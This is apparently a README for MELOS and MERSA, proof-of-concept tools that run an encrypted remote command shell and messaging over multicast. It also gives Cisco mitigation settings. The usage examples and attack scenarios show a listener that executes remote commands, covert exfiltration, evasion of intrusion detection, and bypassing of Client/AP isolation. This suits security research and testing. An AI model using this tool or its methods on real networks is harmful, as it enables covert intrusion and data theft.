# MERSA and MELOS: AP Isolation Configuration Vulnerability

```Python
     o       .                         o      .
                      .
    .     dBBBBBBBb dBBBBP dBBBBBb  dBBBBP dBBBBBb    .
         dB'   'dP dB     dB  dBP dBP'         'BB' 
.       dB'dB'dB' dBBP   dBBBBP' 'BBBBb   dBBBPBB'  
       dB'dB'dB' dBP    dBP  BB     dBP  dBP   BB'  
      dB'dB'dB' dBBBBP dBP  dB  dBBBBP' 'dBBBBBB'     .
       .      Configuration Vulnerability            .'.
                    .           o              .     |o|
  .      |                                          .'o'.
       --o--        MERSA by 0xFNDH       .         |._.|
         | Zero eXcuses For Non-Dreamers Here       '   '
      o               .                        o     ) (
                                      .             (   )
```

# Overview

 - [Documentation](./README.md#About)
 - [PoC Testing Tools](./PoC/)
 - [Configuration Solutions](./README.md#Patching)
 - [Program Usage Example](./README.md#MELOS-Usage)
 - [Additional Information](./README.md#Additional-Information)

# About

The goal of the MERSA & MELOS PoC is to highlight the potential security issues of multicast-enabled networks and to create solutions to prevent incidences before they occur. Multicast Encrypted RSA (MERSA) and Multicast Encrypted Light Operations Shell (MELOS) are tools that demonstrate how multicast is vulnerable to attacks and evasion techniques by undermining network security policies and bypassing Client/AP isolation. Please do not use in military or secret service organizations, or for illegal purposes. These tools are meant for authorized parties with legal consent to conduct testing.

Multicast Encrypted Light Operations Shell (MELOS) is based around the post-exploitation stage of the penetration testing process as an evasive way to conduct data exfiltration and remote command execution. During a penetration test, once multiple devices have been compromised, MELOS can be run to execute commands over multicast while evading certain network security controls. The use of multicast may also reduce the footprint of activity on the network during a penetration test.

Multicast Encrypted RSA (MERSA) is an asymmetrically encrypted communication tool enabling secure communication between two or more individuals over multicast. It is utilized for testing multicast communications without any command execution.

MERSA and MELOS can only communicate to devices contained within the same VLAN. Multicast uses both IGMP (L3) or PIM (L2) to route packets and operates outside of Internet Protocol (IP). Security controls that are specific for internet protocol do not affect multicast traffic. Network Intrusion Detection Systems (NIDS) may be weak to multicast evasion techniques if they do not properly monitor and control multicast traffic.

# Patching

```diff
- We recommend disabling multicast on interfaces that prevent external devices/endpoints from using multicast.
- Keep in mind that certain network tools and protocols (such as SNMP, OSPF, EIGRP) rely on multicast and
- will not operate properly if multicast is globally disabled.
```

> Configuring your network with VLANs and proper configurations can mitigate most of the risks associated with multicast.

> Please consult your network administrator prior to making any changes to router configurations. Making unscheduled modifications to the configurations can have adverse effects on the services or devices operating within the network.

**How to disable multicast for Cisco IOS XE 3.2SE+**

```ruby
! Disable multicast on a specific interface (Recommended)
router(config)# interface gigabitethernet 0/0/0
router(config-if)# no ip multicast-routing
router(config-if)# no ip igmp
router(config-if)# no ip pim
router(config-if)# end

! Disable all multicast traffic (Not-Recommended)
router(config)# no ip multicast-routing
router(config)# no ip igmp
router(config)# no ip pim
```

**How to log multicast interactions for Cisco IOS XE Everest 16.6.1+**
> Enabling logs can assist the incident response team in investigating a breach.
```ruby
! Permit a range for allowed multicast channels
router(config)# ip igmp profile 40
router(config-igmp-profile)# permit
router(config-igmp-profile)# range 224.0.0.1 233.255.255.255
router(config-igmp-profile)# exit
router(config)# interface gigabitethernet 0/0/0
router(config-if)# switchport
router(config-if)# ip igmp filter 40
router(config-if)# end

! Dedicate percentage of memory for caching multicast
router(config-mdns)# cache-memory-max 10

! Enable explicit tracking of hosts, groups, and channels for IGMPv3
! When explicit tracking is enabled, the device will use more memory
router(config)# ip multicast-routing
router(config)# interface gigabitethernet 0/0/0
router(config-if)# ip pim sparse-dense-mode 
router(config-if)# ip igmp version 3 
router(config-if)# ip igmp explicit-tracking
router(config-if)# end

```

**How to prevent unnecessary forwarding of multicast packets Cisco IOS XE 3.2SE+**
> Network switches may be unaware of which network devices are part of multicast groups, and which are not. It may end up forwarding multicast traffic to devices that do not need it, which takes up network bandwidth and device processing power, slowing the entire network down. IGMP Snooping allows the switch to follow communications and stop forwarding packets when unnecessary.
```ruby
! Enable IGMP Snooping Globally
router(config)# ip igmp snooping
! Enable IGMP Snooping for a VLAN
router(config)# ip igmp snooping vlan 10

! PIM Sparse Mode (PIM-SM) will reduce the spread of multicast traffic
router(config)# interface gigabitethernet 0/0/0
router(config-if)# ip pim sparse-mode
router(config-if)# end
```

## MELOS Usage

> Running --listen will make MELOS execute incoming commands and forward the output.

> The password must be the same on the client and the target otherwise the commands will not be decrypted.

Target
```csharp
$ python3 melos.py --listen --password M3L05
    =[ Awaiting on 224.0.0.251:10020    ]

[10.1.2.3:31337] whoami
```

Attacker
```csharp
$ python3 melos.py --cmd --password M3L05
    =[ MELOS C2 224.0.0.251:10050       ]

melos@224.0.0.251:10050 $ whoami
user
```

## MERSA Usage

```python
$ python3 mersa.py

     =[ Type 'discover' to find hosts.   ]

MERSA(host-id) % discover
[JOIN] 10.200.40.5:55000 has joined.
MERSA(host-id) % 0
MERSA(10.200.40.5) % hi
[MSG-RECV][10.200.40.5:55000] b'hello'

```

# Attack Scenario
### Unicast Enabled Network
In unicast-enabled networks, the main benefit of MERSA/MELOS is the evasiveness of multicast and its ability to avoid certain security controls. Multicast can be neglected or overlooked when designing security systems, increasing the likelihood that multicast-based operations can go undetected.

In this scenario, the attacker would simply need to conduct data exfiltration over multicast using either MERSA or MELOS after obtaining access to a machine.

### Unicast Disabled Network
In a network that employs Client/AP isolation, IP packets sent from one device to another cannot be received. In this context, there are two different scenarios in which MERSA is benefitial.

In the first scenario, the attacker is already within the local administrative network and seeks to obtain files from a public facing server. By infiltrating the server from the outside and deploying MELOS, the attacker gains the ability to execute commands from the internal network. This is significant because firewalls and other systems often impose stricter regulations on outgoing traffic and Client/AP isolation would prevent the viewing of external traffic.

The second scenario involves the attacker gaining physical access to multiple workstations in a network with Client/AP isolation. If the attacker were to install MELOS on these workstations, they would have a shell that they could control from within the network and exfiltrate information from.

# Additional Information

## When should you use MERSA vs MELOS?

MELOS is designed for penetration testing in the post-exploitation stage. MERSA is designed to test secure communication over multicast. If there are systems monitoring multicast, both programs can be detected.

```R
       |
     --o--     .                         .
       |                      .
    .    dBBBBBBb  dBBBP  dBP    dBBBBP dBBBBP
        dB'   dB' dB     dBP    dB' BP BP'      .
       dB'dB'dB' dBBP   dBP    dB' BP  'BBBBb 
      dB'dB'dB' dBP    dBP    dB' BP      dBP 
     dB'dB'dB' dBBBBP dBBBBP dBBBBP  dBBBBP'                 
 '                             o               |  
                    .                     .  --o--
+ Reverse Shell               .                |
+ Zero Dependencies      
+ Small Packet Size                         .
+ Windows/MAC/Linux Support         o
+ Configurable    . 
- Weak Encryption                              .
- Spoofable               o
   --o--
     |        .                       o      .
                      '
    .   dBBBBBBBb dBBBBP dBBBBBb  dBBBBP dBBBBBb 
       dB'   'dP dB     dB  dBP dBP'         'BB'    .
      dB'dB'dB' dBBP   dBBBBP' 'BBBBb   dBBBPBB'  
     dB'dB'dB' dBP    dBP  BB     dBP  dBP   BB' 
    dB'dB'dB' dBBBBP dBP  dB  dBBBBP' 'dBBBBBB'    .
       .                       .                  
  o                 .                    .    
+ Asymetric Encryption        o
+ Autonomous Peer-to-Peer          .        |
+ No Configurations Needed                --o--
+ Nonrepudiation           .                |
- Not-Configurable by Default      
- MAC Support Only              .
- PyCryptoDome Dependancy               o
             .
.                                   .
        'dBBBBb  dBBBBBP  dBBBBBP dBP dBP      .
   o    dBP  dB dB   BP        .           
       dBBBBb  dB   BP    dBP   dBBBBBP  
 .    dB  db  dB   BP  . dBP   dBP dBP       o
     dBBBBb  dBBBBBP    dBP   dBP dBP'    
      .                          .
                o                        .
+ Avoid Systems That Do Not Monitor Multicast    .
+ Do Not Produce Logs By Default
+ Can Be Modified           .
+ Can Reach Outside The Broadcast Domain      .
+ Bypass Cisco AP/Client Isolation    o
- Do Not Hide Data Within Legitimate Packets
- Require Python To Be Installed
- Cannot Bypass VLANs            .
     .                                    .
```

> This research is designed to raise awareness of the potential risks associated with multicast.

## Resources

> [Cisco Multicast Commands](https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst3850/software/release/16-12/command_reference/b_1612_3850_cr/ip_multicast_routing_commands.html)

> [Cisco IP Multicast Technology Overview](https://www.cisco.com/c/en/us/td/docs/ios/solutions_docs/ip_multicast/White_papers/mcst_ovr.html)

> [Cloudflare IGMP Introduction](https://www.cloudflare.com/learning/network-layer/what-is-igmp/)

> [IANA Multicast Addresses](https://www.iana.org/assignments/multicast-addresses/multicast-addresses.xhtml)

> [Secure Multicast Communication of MANET](https://link.springer.com/article/10.1007/s11276-015-1065-2)
